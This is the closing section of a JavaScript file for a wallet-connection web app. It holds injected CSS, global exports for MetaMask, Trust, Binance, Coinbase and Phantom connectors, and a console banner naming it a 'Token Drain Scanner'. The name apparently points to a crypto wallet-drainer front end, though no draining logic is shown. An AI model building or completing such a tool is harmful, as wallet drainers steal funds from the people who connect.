            transition: background 0.2s;
        }
        
        .token-card:hover {
            background: #f9fafb;
        }
        
        .token-card:last-child {
            border-bottom: none;
        }
        
        .token-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            overflow: hidden;
            flex-shrink: 0;
        }
        
        .token-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .token-icon-fallback {
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 20px;
        }
        
        .token-details {
            flex: 1;
        }
        
        .token-name-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 4px;
        }
        
        .token-symbol {
            font-weight: 600;
            color: #111827;
            font-size: 16px;
        }
        
        .token-amount {
            font-weight: 500;
            color: #111827;
            font-size: 15px;
        }
        
        .token-value {
            color: #059669;
            font-size: 14px;
            font-weight: 500;
        }
        
        .loading, .no-tokens, .error {
            text-align: center;
            padding: 60px 40px;
        }
        
        .loading {
            color: #6b7280;
            font-size: 16px;
        }
        
        .no-tokens {
            color: #6b7280;
        }
        
        .no-tokens p {
            margin: 8px 0;
        }
        
        .error {
            color: #dc2626;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .wallets-grid {
                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                gap: 16px;
                padding: 24px;
            }
            
            .wallet-card {
                padding: 20px;
            }
            
            .wallet-icon {
                width: 56px;
                height: 56px;
                margin-bottom: 16px;
            }
            
            .wallet-emoji {
                font-size: 28px;
            }
            
            .wallet-name {
                font-size: 16px;
            }
        }
        
        @media (max-width: 640px) {
            .wallets-grid {
                grid-template-columns: 1fr;
            }
            
            .modal-header {
                padding: 24px 24px 16px;
            }
            
            .modal-header h3 {
                font-size: 24px;
            }
            
            .chain-header {
                padding: 16px 20px;
            }
        }
        
        @media (max-width: 480px) {
            .wallet-selector-modal {
                border-radius: 16px;
            }
            
            .wallets-grid {
                padding: 20px;
            }
            
            .token-card {
                padding: 12px;
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Initialize on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions global
window.closeWalletSelector = closeWalletSelector;
window.connectMetaMask = connectMetaMask;
window.connectTrustWallet = connectTrustWallet;
window.connectBinanceWallet = connectBinanceWallet;
window.connectCoinbaseWallet = connectCoinbaseWallet;
window.connectPhantomWallet = connectPhantomWallet;
window.connectAnyWallet = connectAnyWallet;
window.installWallet = installWallet;

console.log('=== Token Drain Scanner ===');
console.log('Version: ULTIMATE - All Wallets Isolated');
console.log('Features:');
console.log('- Each wallet connects independently');
console.log('- No wallet mixing');
console.log('- Shows ALL wallets (installed/not)');
console.log('- Scans 9+ chains');
console.log('- Sleek responsive UI');
console.log('===========================');
